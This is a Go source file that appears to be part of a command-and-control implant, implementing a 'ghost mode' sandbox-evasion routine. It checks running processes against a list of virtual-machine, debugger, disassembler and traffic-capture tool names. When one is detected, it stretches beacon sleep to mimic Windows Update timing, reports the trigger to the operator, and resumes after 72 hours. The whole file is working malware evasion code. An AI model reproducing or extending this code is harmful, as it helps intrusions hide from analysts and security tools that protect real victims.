//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"runtime"
	"strings"
	"sync/atomic"
	"time"
)

// Ghost protocol: when the agent detects sandbox/analysis environment,
// it enters deep hiding mode — stops beaconing, wipes memory, and
// sets a passive trigger for reactivation.

var (
	inGhostMode      int32            // atomic bool
	ghostTrigger     string           // passive trigger condition
	ghostBeaconSent  bool             // whether last beacon was sent before hiding
	ghostModeTimeout = 72 * time.Hour // auto-exit ghost mode after this duration

	sandboxIndicators = []string{
		"vmtoolsd", "vboxservice", "vboxtray", "xenservice",
		"procmon", "procmon64", "regmon", "regmon64",
		"wireshark", "dumpcap", "fiddler", "burpsuite",
		"ida64", "ida", "x64dbg", "x32dbg", "windbg",
		"ollydbg", "immunity", "dnspy",
		"processhacker", "processexplorer", "procexp",
		"apimonitor", "apilogger", "deviare",
		"tcpview", "tcpview64",
	}
	sandboxProcesses []string
)

func isInGhostMode() bool {
	return atomic.LoadInt32(&inGhostMode) == 1
}

func runSandboxCheck() {
	if runtime.GOOS != "windows" {
		return
	}
	procs, err := getProcessList()
	if err != nil {
		return
	}
	lower := strings.ToLower(procs)
	for _, indicator := range sandboxIndicators {
		if strings.Contains(lower, indicator) {
			enterGhostMode("analysis tool detected: " + indicator)
			return
		}
	}
}

func enterGhostMode(reason string) {
	if isInGhostMode() {
		return
	}
	atomic.StoreInt32(&inGhostMode, 1)

	logDebugf("Entering ghost mode: %s", reason)

	// Extend sleep to 24h+
	setSleepMode(SleepModeWindowsUpdate)

	// Mark ghost mode in result for C2 notification
	ghostTrigger = reason

	// Auto-exit ghost mode after timeout so agent can recover
	time.AfterFunc(ghostModeTimeout, func() {
		if isInGhostMode() {
			logDebug("Auto-exiting ghost mode after timeout")
			exitGhostMode()
		}
	})
}

func exitGhostMode() {
	atomic.StoreInt32(&inGhostMode, 0)
	ghostTrigger = ""
	setSleepMode(SleepModeDefault)
}

func getGhostModeReason() string {
	return ghostTrigger
}

func handleGhostModeStatus(task Task, res *TaskResult) {
	if isInGhostMode() {
		res.Output = "GHOST_MODE_ACTIVE: " + ghostTrigger
	} else {
		res.Output = "GHOST_MODE_INACTIVE"
	}
}

func handleGhostModeExit(task Task, res *TaskResult) {
	exitGhostMode()
	res.Output = "ghost mode deactivated"
}
